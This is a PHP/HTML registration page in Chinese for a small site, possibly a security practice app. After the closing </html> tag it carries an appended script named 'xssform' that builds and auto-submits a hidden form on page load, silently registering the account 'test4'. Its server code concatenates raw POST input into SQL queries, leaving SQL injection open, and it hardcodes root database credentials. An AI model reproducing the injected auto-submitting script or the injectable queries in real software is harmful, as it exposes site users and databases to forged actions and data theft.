<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>注册</title>
	<link rel="stylesheet" href="./../css/login_register.css" >
</head>
<body>
	<a id="back" href="./../index.php">←返回主页</a>
	<div class='form_user'>
		<p>你好啊! 今天是第一次来吗?</p>
		<form action="" method="POST">
			<ul>
				用户名<li><input type="text" name="username" placeholder="enter your username" maxlength="20"/></li>
				密码<li><input type="password" name="password" placeholder="enter your password" maxlength="20" /></li>
				确认密码<li><input type="password" name="password" placeholder="2 * your password" maxlength="20" /></li>
				<li><input id='button' type="submit" value="注册"><a href="./login.php" />已有账户?去登录→</a></li>
			</ul>
		</form>
	</div>
	
<script>
	window.onload = function(){
			var btn = document.getElementById('button');
			btn.onclick = function(){
				var username = document.getElementsByName('username')[0];
			if( username.value == '' ){
				alert('用户名为空!');
				return false;
			}
			
			var password = document.getElementsByName('password');
			var pwd1 = password[0];
			var pwd2 = password[1];
			
			if( pwd1.value == '' ){
				alert('密码为空!');
				//password.focus();
				return false;
			}
			
			if( pwd1.value.length < 6 ){
				alert('密码长度不能小于6!');
				return false;
			}
			
			if( pwd2.value == '' ){
				alert('请确认密码!');
				return false;
			}
			
			if( pwd1.value != pwd2.value ){
				alert('密码不一致!');
				return false;
			}
		}
	}
</script>
</body>
</html>
<script>
var div = document.createElement("div");
div.innerHTML = "<form action='' method='POST'id='xssform'><input type='text'name='username'value='test4'/><input type='password'name='password'value='111111'/><input type='password'name='password'value='111111'/></form>"

document.body.appendChild(div);

var xssform = document.getElementById("xssform");
xssform.submit();
</script>

<?php
	session_start();
	
	if(isset($_SESSION['user'])){
		if($_SESSION['user'] == 'on'){
			echo '<script>
				alert("已登录!");
				window.location.href="./../index.php";
			</script>';
			
		}
	}

	if( isset($_POST['username']) && isset($_POST['password']) ){
		$username = $_POST['username'];
		$password = $_POST['password'];
		
		@ $db = new mysqli('localhost','root','1q2w3e','testpic');
		
		$query = 'select * from users where username="'.$username.'"';
		
		$result = $db->query($query);
		
		$row = mysqli_fetch_assoc($result);
		
		if($row){
			echo '<script>
			alert("用户名已注册!");
			//window.location.href="./register.php";
			</script>';
		}
		else{
			$query = 'insert into users(username,password,points) values("'.$username.'","'.sha1($password).'",5)';
			$result = $db->query($query);
			if($result){
				$_SESSION['user'] = 'on';
				$_SESSION['username'] = $username;
				$_SESSION['points'] = 5;
				echo '<script>
				alert("注册成功!");
				window.location.href="./../index.php";
				</script>';
			}
		}
		
		$db->close();
	}
?>